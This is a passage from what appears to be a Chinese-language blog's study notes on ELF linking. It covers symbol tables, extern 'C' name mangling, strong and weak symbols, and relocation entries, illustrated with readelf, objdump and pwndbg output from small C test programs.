FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">15</span>: <span class="number">0000000000002110</span>     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __FRAME_END__</span><br><span class="line">    <span class="number">16</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    <span class="number">17</span>: <span class="number">0000000000003</span>dc8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> _DYNAMIC</span><br><span class="line">    <span class="number">18</span>: <span class="number">0000000000002008</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT   <span class="number">19</span> __GNU_EH_FRAME_HDR</span><br><span class="line">    <span class="number">19</span>: <span class="number">0000000000003f</span>b8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">24</span> _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">20</span>: <span class="number">0000000000001149</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> func1</span><br><span class="line">    <span class="number">21</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]</span><br><span class="line">    <span class="number">22</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    <span class="number">23</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT   <span class="number">25</span> data_start</span><br><span class="line">    <span class="number">24</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> _edata</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000000011</span>ac     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">17</span> _fini</span><br><span class="line">    <span class="number">26</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND <span class="built_in">printf</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">    <span class="number">27</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> __data_start</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000000000401</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">26</span> global_uninit_var</span><br><span class="line">    <span class="number">29</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    <span class="number">30</span>: <span class="number">0000000000004008</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __dso_handle</span><br><span class="line">    <span class="number">31</span>: <span class="number">0000000000002000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">18</span> _IO_stdin_used</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000000000004028</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> _end</span><br><span class="line">    <span class="number">33</span>: <span class="number">0000000000001060</span>    <span class="number">38</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> _start</span><br><span class="line">    <span class="number">34</span>: <span class="number">0000000000004010</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">25</span> global_init_var</span><br><span class="line">    <span class="number">35</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> __bss_start</span><br><span class="line">    <span class="number">36</span>: <span class="number">0000000000001174</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> main</span><br><span class="line">    <span class="number">37</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __TMC_END__</span><br><span class="line">    <span class="number">38</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br><span class="line">    <span class="number">40</span>: <span class="number">0000000000001000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">12</span> _init</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555555000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">1000</span>   <span class="number">1000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555556000</span>     <span class="number">0x555555557000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555557000</span>     <span class="number">0x555555558000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555558000</span>     <span class="number">0x555555559000</span> rw-p     <span class="number">1000</span>   <span class="number">3000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x7ffff7d86000</span>     <span class="number">0x7ffff7d89000</span> rw-p     <span class="number">3000</span>      <span class="number">0</span> [anon_7ffff7d86]</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555558000</span>+<span class="number">0x14</span></span><br><span class="line"><span class="number">0x555555558014</span> &lt;static_var<span class="number">.1</span>&gt;:  <span class="number">0x0000000000000055</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558024</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558034</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558044</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558054</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558064</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558074</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558084</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558094</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555580a4</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h3 id="符号表中符号可以大致分为如下几类"><a href="#符号表中符号可以大致分为如下几类" class="headerlink" title="符号表中符号可以大致分为如下几类"></a>符号表中符号可以大致分为如下几类</h3><blockquote>
<p>（真实性有待商榷，没有链接器的实现基础）</p>
</blockquote>
<ul>
<li>能被外部引用的，无static关键字修饰的全局符号</li>
<li>static修饰的符号</li>
<li>本程序引用的外部符号，如本程序的printf函数</li>
<li>段名</li>
</ul>
<h3 id="一些杂记"><a href="#一些杂记" class="headerlink" title="一些杂记"></a>一些杂记</h3><blockquote>
<p>c++中会支持函数重载，也就是同名函数会经过其所在类，命名空间，参数类型，符号类型等再次修饰，导致虽然变量名一样但是其实编译之后是不一样的，所以可以支持这个特性，但是问题是，若想要c++兼容c库就不是那么好办了，c中没有此特性，因此c++中使用c库的函数声明就会被重载，导致符号位定义错误，具体如下：</p>
</blockquote>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*c的库文件貌似适配做的很好，如果直接包含c库文件是不会出现这个问题的，就当是一个小知识吧*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">会出现：</span><br><span class="line">root@L:/home/l/c++<span class="meta"># g++ extern.cpp -o ex</span></span><br><span class="line">/usr/bin/ld: /tmp/cctEKkS7.o: in function `main<span class="number">&#x27;</span>:</span><br><span class="line"><span class="keyword">extern</span>.cpp:(.text+<span class="number">0x23</span>): undefined reference to `<span class="built_in">printf</span>(<span class="type">char</span> <span class="type">const</span>*, ...)&#x27;</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">如果这样就会告诉编译器不会命名修饰，因此可以编译成功</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="强弱符号与强弱引用"><a href="#强弱符号与强弱引用" class="headerlink" title="强弱符号与强弱引用"></a>强弱符号与强弱引用</h4><blockquote>
<p>强弱符号可以解决同名冲突的问题，若遇上同名的定义符号，优先使用强符号，注意是对定义而言，而非引用（声明）。</p>
</blockquote>
<p><img src="/img/mypic/strsym.png" alt="strsym"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++# ./strong </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>强引用弱引用则是可以当外部引用找不到定义的时候不报错，增加了程序的容错性。</p>
<p>但是注意执行的时候还是会报错，call的时候会把一个无效地址给rip，导致segment fault（非法地址访问）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__attribute__((weak)) <span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc strong.c -o strong</span></span><br><span class="line">root@L:/home/l/c++# </span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF之链接初探</title>
    <url>/2024/08/15/ELF%E4%B9%8B%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* a.c */</span></span><br><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*b.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    *b ^= *a ^= *b ^= *a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h1><blockquote>
<p>主要分为两步：</p>
<p>1.空间和地址分配</p>
<p>2.符号解析和重定位</p>
</blockquote>
<h2 id="空间和地址分配"><a href="#空间和地址分配" class="headerlink" title="空间和地址分配"></a>空间和地址分配</h2><blockquote>
<p>主要涉及到相似节合并和虚拟地址空间的分配以及映射关系的建立,可以观察到VMA在链接之后被分配</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h ab</span></span><br><span class="line"></span><br><span class="line">ab:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">00000000004001</span>c8  <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">1</span> .text         <span class="number">00000084</span>  <span class="number">0000000000401000</span>  <span class="number">0000000000401000</span>  <span class="number">00001000</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">2</span> .eh_frame     <span class="number">00000058</span>  <span class="number">0000000000402000</span>  <span class="number">0000000000402000</span>  <span class="number">00002000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">3</span> .data         <span class="number">00000004</span>  <span class="number">0000000000404000</span>  <span class="number">0000000000404000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">4</span> .comment      <span class="number">0000002b</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00003004</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">00000035</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000004</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000078</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h b.o</span></span><br><span class="line"></span><br><span class="line">b.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">0000004f</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000b</span>b  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c0  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000e0</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br></pre></td></tr></table></figure>

<h2 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h2><h3 id="先来看一下结果"><a href="#先来看一下结果" class="headerlink" title="先来看一下结果"></a>先来看一下结果</h3><blockquote>
<p>可以看到符号的地址已经变成了VMA</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s ab</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">9</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000401035</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> swap</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000404000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> shared</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> __bss_start</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000401000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> main</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _edata</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000404008</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _end</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.O</span></span><br><span class="line">readelf: Error: <span class="string">&#x27;a.O&#x27;</span>: No such file</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">6</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> shared</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s b.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">4</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> swap</span><br></pre></td></tr></table></figure>

<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h3 id="本程序实例"><a href="#本程序实例" class="headerlink" title="本程序实例"></a>本程序实例</h3><blockquote>
<p>可以用工具需要重定位的位置，这里有个问题，就是值都是地址减4感觉是个问题，call的话明明需要减去下一条指令的地址才对，有机会研究一下。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -r a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">000000000000001</span>a R_X86_64_PC32     shared<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">000000000000002</span>a R_X86_64_PLT32    swap<span class="number">-0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000000020</span> R_X86_64_PC32     .text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;main&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   c7 <span class="number">45</span> fc <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x64</span>,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">  <span class="number">13</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">45</span> fc             lea    <span class="number">-0x4</span>(%rbp),%rax</span><br><span class="line">  <span class="number">17</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rdx        # <span class="number">1</span>e &lt;main+<span class="number">0x1e</span>&gt;</span><br><span class="line">  <span class="number">1</span>e:   <span class="number">48</span> <span class="number">89</span> d6                mov    %rdx,%rsi</span><br><span class="line">  <span class="number">21</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">24</span>:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">29</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">2</span>e &lt;main+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">2</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">33</span>:   c9                      leave  </span><br><span class="line">  <span class="number">34</span>:   c3                      ret    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接下来分析一下hex的存储。</span></span><br><span class="line"><span class="comment">可以观察到偏移和append都是正确的（注意小端序）</span></span><br><span class="line"><span class="comment">具体字段ffffff fffffffffc应该是-4，到时候怎么用还得看下面</span></span><br><span class="line"><span class="comment">00000003 00000002 根据符号表的位置知道高三十二位代表索引，低32位则代表类型，盲猜类型应该根怎么重定位有关系</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 2 a.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.rela.text&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">1</span>a000000 <span class="number">00000000</span> <span class="number">02000000</span> <span class="number">03000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> fcffffff ffffffff <span class="number">2</span>a000000 <span class="number">00000000</span> ........*.......</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">04000000</span> <span class="number">05000000</span> fcffffff ffffffff ................</span><br></pre></td></tr></table></figure>

